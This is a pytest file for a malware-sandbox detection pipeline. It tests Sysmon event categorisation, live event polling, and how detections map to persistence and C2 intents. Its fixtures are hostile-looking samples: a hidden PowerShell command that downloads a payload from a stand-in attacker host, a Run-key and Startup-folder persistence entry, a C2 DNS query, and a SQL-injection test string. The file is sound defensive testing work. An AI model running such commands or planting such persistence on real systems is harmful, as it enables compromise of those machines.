"""Phase 3 Sysmon mapping and live-poll tests."""

from __future__ import annotations

import asyncio
from datetime import datetime, timezone

import pytest
from pydantic import ValidationError

from adam.collectors.parsers.evtx import category_for_sysmon_event
from adam.common.config import LiveSettings
from adam.contracts.enums import Category
from adam.contracts.raw_event import RawEvent
from adam.fusion.engine import EventFusionEngine
from adam.fusion.mapping import map_detection_to_intent
from adam.fusion.models import RawEvent as FusionRawEvent
from adam.orchestrator.session import SessionOrchestrator, raw_event_from_sysmon_item
from adam.sandbox.guest.http_models import SysmonRecordItem


def _item(event_id: int, record_id: int, data: dict[str, str]) -> SysmonRecordItem:
    return SysmonRecordItem(
        record_id=record_id,
        event_id=event_id,
        time_created="2026-01-01T00:00:00.000Z",
        data=data,
    )


def _to_fusion(raw: RawEvent) -> FusionRawEvent:
    return FusionRawEvent(
        timestamp=raw.occurred_at,
        source="sysmon",
        event_type=raw.category.value,
        process_id=raw.process.pid if raw.process else None,
        parent_process_id=raw.process.ppid if raw.process else None,
        process_name=raw.process.image if raw.process else raw.attributes.get("process_name"),
        command_line=raw.process.command_line if raw.process else raw.attributes.get("command_line"),
        payload=raw.attributes,
    )


def _detection_for(item: SysmonRecordItem):
    raw = raw_event_from_sysmon_item(item, session_id="sess")
    result = EventFusionEngine().process([_to_fusion(raw)])
    assert result.detections, f"no detector fired for EventID={item.event_id}"
    return raw, result.detections[0]


@pytest.mark.parametrize(
    ("event_id", "expected"),
    [
        (1, Category.PROCESS),
        (3, Category.NETWORK),
        (5, Category.PROCESS),
        (11, Category.FILE),
        (12, Category.REGISTRY),
        (13, Category.REGISTRY),
        (22, Category.NETWORK),
        (99, Category.SYSTEM),
    ],
)
def test_category_for_sysmon_event(event_id: int, expected: Category) -> None:
    assert category_for_sysmon_event(event_id) is expected


def test_live_event_ids_are_normalised_and_deduplicated() -> None:
    settings = LiveSettings(sysmon_event_ids=" 1, 3,3, 13 ")
    assert settings.sysmon_event_ids == "1,3,13"


@pytest.mark.parametrize("bad", ["", "1,3;2", "1,EventID=3", "1,3') or 1=1--"])
def test_live_event_ids_reject_injection(bad: str) -> None:
    with pytest.raises(ValidationError):
        LiveSettings(sysmon_event_ids=bad)


def test_raw_event_registry_value_set() -> None:
    raw = raw_event_from_sysmon_item(
        _item(
            13,
            10,
            {
                "Image": "C:\\Windows\\System32\\reg.exe",
                "ProcessId": "123",
                "ProcessGuid": "{guid}",
                "User": "CORP\\user",
                "EventType": "SetValue",
                "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\evil",
                "Details": "C:\\Temp\\evil.exe",
            },
        ),
        session_id="sess",
    )
    assert raw.category is Category.REGISTRY
    assert raw.attributes["TargetObject"].endswith("Run\\evil")
    assert raw.attributes["Details"] == "C:\\Temp\\evil.exe"
    assert raw.attributes["process_name"] == "C:\\Windows\\System32\\reg.exe"
    assert raw.process is not None
    assert raw.process.pid == 123


def test_raw_event_file_create() -> None:
    raw = raw_event_from_sysmon_item(
        _item(
            11,
            11,
            {
                "Image": "C:\\Temp\\dropper.exe",
                "ProcessId": "456",
                "TargetFilename": r"C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.lnk",
            },
        ),
        session_id="sess",
    )
    assert raw.category is Category.FILE
    assert "Startup" in raw.attributes["TargetFilename"]
    assert raw.attributes["process_name"] == "C:\\Temp\\dropper.exe"


def test_raw_event_dns() -> None:
    raw = raw_event_from_sysmon_item(
        _item(
            22,
            12,
            {
                "Image": "C:\\Temp\\malware.exe",
                "ProcessId": "789",
                "QueryName": "c2.baddomain.org",
                "QueryStatus": "0",
                "QueryResults": "203.0.113.7;",
            },
        ),
        session_id="sess",
    )
    assert raw.category is Category.NETWORK
    assert raw.attributes["QueryName"] == "c2.baddomain.org"
    assert raw.attributes["QueryStatus"] == "0"


def test_registry_run_key_produces_persistence_intent() -> None:
    _, detection = _detection_for(
        _item(
            13,
            20,
            {
                "Image": "C:\\Windows\\System32\\reg.exe",
                "ProcessId": "100",
                "EventType": "SetValue",
                "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\evil",
                "Details": "C:\\Temp\\evil.exe",
            },
        )
    )
    intent, _, technique = map_detection_to_intent(detection)
    assert intent == "PERSIST_RUN_KEY"
    assert technique == "T1547"


def test_startup_file_drop_produces_persistence_intent() -> None:
    _, detection = _detection_for(
        _item(
            11,
            21,
            {
                "Image": "C:\\Temp\\dropper.exe",
                "ProcessId": "101",
                "TargetFilename": r"C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.lnk",
            },
        )
    )
    intent, _, technique = map_detection_to_intent(detection)
    assert intent == "PERSIST_RUN_KEY"
    assert technique == "T1547"


def test_dns_c2_query_produces_c2_intent() -> None:
    _, detection = _detection_for(
        _item(
            22,
            22,
            {
                "Image": "C:\\Temp\\malware.exe",
                "ProcessId": "102",
                "QueryName": "c2.baddomain.org",
                "QueryStatus": "0",
            },
        )
    )
    intent, _, technique = map_detection_to_intent(detection)
    assert intent == "C2_BEACON"
    assert technique == "T1071"


def test_process_create_suspicious_command_line_produces_c2_intent() -> None:
    _, detection = _detection_for(
        _item(
            1,
            23,
            {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessId": "103",
                "CommandLine": "powershell -nop -w hidden iwr http://evil.example/payload",
            },
        )
    )
    intent, _, technique = map_detection_to_intent(detection)
    assert intent == "C2_BEACON"
    assert technique == "T1071"


class RecordingBus:
    def __init__(self) -> None:
        self.envelopes: list[object] = []

    async def publish(self, envelope: object) -> None:
        self.envelopes.append(envelope)


class FakeController:
    vm_profile = None


class FakeSysmonChannel:
    def __init__(
        self,
        *,
        baseline: int = 100,
        batches: list[list[SysmonRecordItem]] | None = None,
        fail_baseline: bool = False,
    ) -> None:
        self.baseline = baseline
        self.batches = batches or []
        self.fail_baseline = fail_baseline
        self.calls: list[tuple[int, str]] = []
        self.stop_event: asyncio.Event | None = None

    async def get_sysmon_events_since(
        self,
        record_id: int = 0,
        event_ids: str = "1,3",
        channel: str | None = None,
    ) -> tuple[int, list[SysmonRecordItem]]:
        self.calls.append((record_id, event_ids))
        if record_id < 0:
            if self.fail_baseline:
                raise RuntimeError("sysmon baseline unavailable")
            return self.baseline, []
        if self.batches:
            batch = self.batches.pop(0)
            if not batch:
                if self.stop_event is not None:
                    self.stop_event.set()
                return record_id, []
            return batch[-1].record_id, batch
        if self.stop_event is not None:
            self.stop_event.set()
        return record_id, []


def _orchestrator(channel: FakeSysmonChannel, bus: RecordingBus) -> SessionOrchestrator:
    return SessionOrchestrator(
        FakeController(),  # type: ignore[arg-type]
        bus,  # type: ignore[arg-type]
        [],
        artifacts_dir="unused",
        guest_agent=channel,  # type: ignore[arg-type]
    )


def _registry_record(record_id: int) -> SysmonRecordItem:
    return _item(
        13,
        record_id,
        {
            "Image": "C:\\Windows\\System32\\reg.exe",
            "ProcessId": "123",
            "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\evil",
            "Details": "C:\\Temp\\evil.exe",
        },
    )


@pytest.mark.asyncio
async def test_live_poll_publishes_registry_event() -> None:
    channel = FakeSysmonChannel(batches=[[_registry_record(101)]])
    bus = RecordingBus()
    orchestrator = _orchestrator(channel, bus)
    stop = asyncio.Event()
    channel.stop_event = stop

    await asyncio.wait_for(
        orchestrator._run_live_sysmon_poll(
            "sess", stop, initial_record_id=-1, poll_interval_s=0.01
        ),
        timeout=1.0,
    )

    assert channel.calls[0] == (-1, "1,3,5,11,12,13,22")
    assert len(bus.envelopes) == 1
    envelope = bus.envelopes[0]
    assert envelope.payload.category is Category.REGISTRY
    assert envelope.payload.attributes["TargetObject"].endswith("Run\\evil")


@pytest.mark.asyncio
async def test_live_poll_batches_more_than_batch_size() -> None:
    records = [_registry_record(1000 + index) for index in range(150)]
    channel = FakeSysmonChannel(batches=[records[:100], records[100:]])
    bus = RecordingBus()
    orchestrator = _orchestrator(channel, bus)
    stop = asyncio.Event()
    channel.stop_event = stop

    await asyncio.wait_for(
        orchestrator._run_live_sysmon_poll(
            "sess",
            stop,
            initial_record_id=-1,
            poll_interval_s=0.01,
            batch_size=100,
        ),
        timeout=2.0,
    )

    assert len(bus.envelopes) == 150


@pytest.mark.asyncio
async def test_live_poll_disables_on_baseline_failure() -> None:
    channel = FakeSysmonChannel(fail_baseline=True)
    bus = RecordingBus()
    orchestrator = _orchestrator(channel, bus)
    stop = asyncio.Event()

    await asyncio.wait_for(
        orchestrator._run_live_sysmon_poll(
            "sess", stop, initial_record_id=-1, poll_interval_s=0.01
        ),
        timeout=1.0,
    )

    assert bus.envelopes == []
    assert channel.calls == [(-1, "1,3,5,11,12,13,22")]
